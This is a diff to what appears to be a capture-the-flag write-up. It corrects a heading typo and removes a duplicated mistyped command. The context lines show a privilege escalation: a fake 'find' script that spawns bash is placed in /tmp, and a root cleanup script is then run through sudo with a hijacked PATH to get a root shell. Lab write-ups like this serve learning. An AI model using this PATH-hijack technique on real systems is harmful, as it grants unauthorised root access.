@@ -101,7 +101,7 @@ we just give this to filetype and we are done :)
 
 No further configuration details of Nginx confirm the existance of another server.
 
-# System anaysis
+# System analysis
 
 ## Checking for suid
 
@@ -254,8 +254,6 @@ $ cat find
 #!/bin/bash
 bash
 $ chmod +x find
-$ $ sudo PATH=/tmp:$PATH /opt/cleanup.sh
-/bin/sh: 31: $: not found
 $ sudo PATH=/tmp:$PATH /opt/cleanup.sh
 ls /root
 root.txt
